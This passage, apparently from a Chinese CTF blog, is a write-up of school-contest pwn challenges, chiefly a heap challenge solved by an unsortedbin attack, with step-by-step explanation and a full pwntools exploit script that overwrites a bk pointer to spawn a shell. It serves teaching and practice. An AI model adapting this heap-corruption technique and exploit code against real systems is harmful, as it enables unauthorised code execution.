p64(0)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>得到shell</p>
+<p><img src="https://cdn.jsdelivr.net/gh/edsdes/ImageBed/img/image-20250407231606473.png" alt="image-20250407231606473"></p>
+<h3 id="想要成为原神高手"><a href="#想要成为原神高手" class="headerlink" title="想要成为原神高手"></a>想要成为原神高手</h3><p>这是一个基本的堆题，有很多方法可以解，我试了下堆溢出任意地址写bss也可以，但我想考察的是unsortedbin attack，这里就讲解此方法。</p>
+<p>一般的堆题都要先换下libc，更换为发放的2.23版本才行 具体更换方法百度一下你就知道</p>
+<p>照例先看看保护</p>
+<p><img src="https://cdn.jsdelivr.net/gh/edsdes/ImageBed/img/image-20250407233007251.png" alt="image-20250407233007251"></p>
+<p>主页面写的很乱 将就着看</p>
+<p><img src="https://cdn.jsdelivr.net/gh/edsdes/ImageBed/img/image-20250407233203740.png" alt="image-20250407233203740"></p>
+<p>有四个选项，看着就像创建，编辑，删除，退出等功能</p>
+<p>创建函数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/edsdes/ImageBed/img/image-20250407233557643.png" alt="image-20250407233557643"></p>
+<p>编辑函数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/edsdes/ImageBed/img/image-20250407233648847.png" alt="image-20250407233648847"></p>
+<p>这里发现编辑多少是由我们输入决定的 所以可以造成堆溢出</p>
+<p>删除函数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/edsdes/ImageBed/img/image-20250407233707828.png" alt="image-20250407233707828"></p>
+<p>这里发现还有个特别的选项</p>
+<p><img src="https://cdn.jsdelivr.net/gh/edsdes/ImageBed/img/image-20250407234132733.png" alt="image-20250407234132733"></p>
+<p>点开阳光青提发现是最喜欢的后门函数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/edsdes/ImageBed/img/image-20250407234237076.png" alt="image-20250407234237076"></p>
+<p>哎呀，去洗了点阳光青提</p>
+<p>所以思路就是让magic大于0x1314就行</p>
+<p>这里就聊到了unsortedbin attack</p>
+<p>Unsorted Bin Attack从字面上就可以看出，正合适一种针对Unsorted  Bin机制的攻击手法。这种攻击手法实现的前提是能够控制挂进unsorted  bin中的chunk的bk指针，在控制bk指针的情况下可以实现修改任意地址值为一个较大的数值。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure>
+
+<p>unsorted_chunk的bk指针指向的是它后一个被释放的chunk的块地址（bck），后一个被释放的chunk的fd指针指向的是unsorted_chunk的块地址。如果我们能够控制unsorted_chunk的bk，那么就意味着可以将unsorted_chunks (av)，即unsorted_chunk的块地址写到任意可写地址内（具体知识可以百度搜索）</p>
+<p>具体看题目讲解（我讲的每一步可以对照最下面的exp并且对应调试效果更佳）</p>
+<p>我们首先先创建三个堆块</p>
+<p><img src="https://cdn.jsdelivr.net/gh/edsdes/ImageBed/img/image-20250408235342115.png" alt="image-20250408235342115"></p>
+<p>前两个用来溢出和构造，最后一个防止合并</p>
+<p>接着我们释放1号堆块（注意我堆块是从0开始算，所以是第二个堆块）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/edsdes/ImageBed/img/image-20250409000039339.png" alt="image-20250409000039339"></p>
+<p>1号堆块我特意搞了个0x80大小，这样释放就可以直接进入unsortedbin中，</p>
+<p>然后我们堆溢出覆写堆块</p>
+<p><img src="https://cdn.jsdelivr.net/gh/edsdes/ImageBed/img/image-20250409000232326.png" alt="image-20250409000232326"></p>
+<p>我们将1号堆块的bk位置写入目标地址也就是magic-0x10 至于为啥是要减0x10后面解释（bk位置如果不知道的话可以先去了解堆结构）</p>
+<p>查看下bins</p>
+<p><img src="https://cdn.jsdelivr.net/gh/edsdes/ImageBed/img/image-20250409000456990.png" alt="image-20250409000456990"></p>
+<p>我们就成功把1号堆块的bk位置写成了magic-0x10</p>
+<p>前面浅浅介绍了unsortedbin attack 我们把位于unsortedbin的堆块（也就是1号堆块）的bk位置写成目标地址-0x10那么堆块申请之后目标地址-0x10位置的fd指针被赋值为了unsorted_chunk的块地址，相当于就是在目标地址填写了一个很大的值，满足了大于0x1314的条件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/edsdes/ImageBed/img/image-20250409001127835.png" alt="image-20250409001127835"></p>
+<p>赋值成功，那么我们输入412后就可以进入阳光青提获取shell</p>
+<p><img src="https://cdn.jsdelivr.net/gh/edsdes/ImageBed/img/image-20250409001317983.png" alt="image-20250409001317983"></p>
+<p>恭喜你成为了mvp</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#elf=ELF(&#x27;./pwn1&#x27;)</span></span><br><span class="line"><span class="comment">#p=remote(&#x27;10.26.229.52&#x27;,32813)</span></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice :&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size of elemental power : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content of elemental power:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice :&quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size of elemental power : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content of elemental power : &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice :&quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;cccc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0x0</span>)+p64(<span class="number">0x91</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x6020C8</span>-<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x40</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;dddd&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;412&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>题目总的来说都是比较简单的基础题，wp也特意写的比较详细，如果还有不懂的可以去问mowen师傅，不过mowen师傅很忙，基本还是得要靠大家自行理解学习。主要目的是让大家对pwn感兴趣，好好学习天天向上，(<del>学好了然后带我躺赢</del>)。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">无敌马b</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/04/20/pwn_wp1/">http://example.com/2025/04/20/pwn_wp1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">无敌马b</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/edsdes/ImageBed/img/touxaing1.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/04/12/%E5%BC%95%E8%A8%80%EF%BC%9A/" title="欢迎来到我的blog"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">欢迎来到我的blog</div></div><div class="info-2"><div class="info-item-1">引言：大学生活感觉有些摆烂，感觉也不能学了跟没学一样，就搭了一个博客浅浅记录下，也希望写会博客能够让我有些学习的动力。（但好像还在摆烂） 可恶，居然被你发现我的博客了😭😭😭 这里可能会记录一些wp，比赛记录，感受心得，以及一些乱七八糟的东西，都有可能写 看我心情。本博客不定时更新，如果有时图片看不了可以开梯子试试，要是一直断更也是可能的（因为本人实在是太菜了没什么好写的）如果还有什么要说的那就是本人还单身，咳咳。如果想要交流学习或者想要相关题目附件可以加我本人qq 1401129008  最后 感谢您能看到这，欢迎来到我的博客，希望您有个愉快的阅读体验OvO </div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://cdn.jsdelivr.net/gh/edsdes/ImageBed/img/touxaing1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">无敌马b</div><div class="author-info-description">I Am Atomic</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/edsdes"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/edsdes" target="_blank" title="Github"><i class="fab fa-github" style="color: #hdhfbb;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">可惜,枫叶红时总多离别</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN"><span class="toc-number">1.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%99%E6%AC%A1%E6%A0%A1%E8%B5%9B%E7%94%B1%E6%88%91%E8%B4%9F%E8%B4%A3%E5%87%BApwn%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%EF%BC%8C%E4%B9%9F%E9%83%BD%E6%8C%BA%E7%AE%80%E5%8D%95%E7%9A%84%E3%80%82"><span class="toc-number">1.1.</span> <span class="toc-text">这次校赛由我负责出pwn部分题目，也都挺简单的。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GGKING%E2%80%99s-gift"><span class="toc-number">1.1.1.</span> <span class="toc-text">GGKING’s gift</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%83%AD%E5%A4%A9text-pro"><span class="toc-number">1.1.2.</span> <span class="toc-text">热天text pro</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A5%B9%E4%B8%8D%E8%A7%81%E4%BA%86"><span class="toc-number">1.1.3.</span> <span class="toc-text">她不见了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%83%B3%E8%A6%81%E6%88%90%E4%B8%BA%E5%8E%9F%E7%A5%9E%E9%AB%98%E6%89%8B"><span class="toc-number">1.1.4.</span> <span class="toc-text">想要成为原神高手</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/20/pwn_wp1/" title="第二届校赛pwn题wp">第二届校赛pwn题wp</a><time datetime="2025-04-20T14:09:58.629Z" title="发表于 2025-04-20 22:09:58">2025-04-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/12/%E5%BC%95%E8%A8%80%EF%BC%9A/" title="欢迎来到我的blog">欢迎来到我的blog</a><time datetime="2025-04-11T17:17:01.169Z" title="发表于 2025-04-12 01:17:01">2025-04-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/08/%E5%B0%8F%E5%89%8D%E8%A8%80%EF%BC%9A/" title="全国大学生软件系统安全华东区域赛wp及乱七八糟东西">全国大学生软件系统安全华东区域赛wp及乱七八糟东西</a><time datetime="2025-04-08T12:28:52.980Z" title="发表于 2025-04-08 20:28:52">2025-04-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/08/starctf2018_babystack/" title="starctf2018_babystack">starctf2018_babystack</a><time datetime="2025-04-08T12:28:52.977Z" title="发表于 2025-04-08 20:28:52">2025-04-08</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(https://cdn.jsdelivr.net/gh/edsdes/ImageBed/img/beijing1.jpg);"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By 无敌马b</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
